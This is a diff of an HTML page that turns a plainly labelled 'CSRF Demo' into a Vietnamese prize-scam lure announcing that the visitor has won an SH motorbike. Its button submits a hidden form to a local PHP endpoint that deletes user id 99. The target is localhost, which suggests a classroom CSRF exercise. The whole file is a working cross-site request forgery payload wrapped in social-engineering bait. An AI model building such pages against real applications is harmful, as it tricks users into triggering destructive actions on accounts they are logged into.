@@ -2,15 +2,59 @@
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <title>CSRF Demo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chúc Mừng Bạn Đã Trúng Thưởng Xe SH</title>
+    <style>
+        body {
+            background-color: #f5f5f5;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        img {
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+            width: 100%;
+        }
+        h1 {
+            text-align: center;
+            font-size: 24px;
+        }
+        .form-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        button[type="submit"] {
+            background-color: #4CAF50;
+            color: white;
+            padding: 14px 20px;
+            margin: 8px 0;
+            border: none;
+            cursor: pointer;
+            width: 100%;
+        }
+        button[type="submit"]:hover {
+            opacity: 0.8;
+        }
+    </style>
 </head>
 <body>
-<h2>CSRF Demo</h2>
-<p>Ấn Vào Đây Để Nhận 500k</p>
-
-<form action="http://localhost:8383/delete_user.php" method="GET">
-    <input type="hidden" name="id" value="9">
-    <button type="submit">Nhận</button>
-</form>
+    <div class="container">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ-jCZ89LmfEh_ioiU9Ko2_vTzdxInKmxkCKg&s" alt="Xe SH" width="300">
+        <h1>Chúc Mừng Bạn Đã Trúng Thưởng Xe SH</h1>
+        <p>Ấn Vào Đây Để Nhận Xe SH</p>
+        <div class="form-container">
+            <form action="http://localhost:8383/delete_user.php" method="GET">
+                <input type="hidden" name="id" value="99">
+                <button type="submit">Nhận</button>
+            </form>
+        </div>
+    </div>
 </body>
 </html>
+
